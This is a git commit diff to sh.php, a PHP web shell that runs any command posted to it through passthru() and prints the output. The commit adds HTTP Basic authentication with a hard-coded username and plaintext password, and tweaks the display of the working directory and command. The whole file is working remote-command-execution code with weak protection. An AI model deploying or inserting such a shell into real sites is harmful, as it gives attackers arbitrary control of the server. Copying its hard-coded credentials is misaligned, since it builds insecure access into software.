9cbc7bcf3c5f5e2ec5206ce046de9c2ee5810d77
Yuriy Novikov <yurijnovikov@gmail.com>
2013-04-25 16:58:05 +0300

    sh.php

--- sh.php
+++ sh.php
@@ -1,3 +1,21 @@
+<?php
+set_time_limit(0);
+
+$users = array('vikoff' => 'r00t+1');
+$authorized = FALSE;
+
+if (!isset($_SERVER['PHP_AUTH_USER'])) {
+    $authorized = FALSE;
+} elseif (isset($users[ $_SERVER['PHP_AUTH_USER'] ]) && $users[ $_SERVER['PHP_AUTH_USER'] ] === $_SERVER['PHP_AUTH_PW']) {
+    $authorized = TRUE;
+}
+if (!$authorized) {
+    header('WWW-Authenticate: Basic realm="Authorize"');
+    header('HTTP/1.0 401 Unauthorized');
+    die('Authorization required');
+}
+
+?>
 <!doctype html>
 <html lang="en">
 <head>
@@ -11,10 +29,15 @@
 		font-size: 14px;
 		width: 500px;
 	}
+	.cmd-show{
+		background-color: #DDD;
+		padding: 0 10px;
+	}
 	</style>
 </head>
 <body>
 <?php
+
 $command = !empty($_POST['command']) ? $_POST['command'] : '';
 $stderr = !empty($_POST['stderr']);
 
@@ -23,7 +46,7 @@ if ($command) {
 	if ($stderr)
 		$cmd .= ' 2>&1';
 
-	echo "<pre>> $cmd:\n\n";
+	echo "<pre> ".getcwd()."$ <span class=\"cmd-show\">$cmd</span>:\n\n";
 	passthru($cmd);
 	echo "\n\n</pre><hr><br><br>";
 }
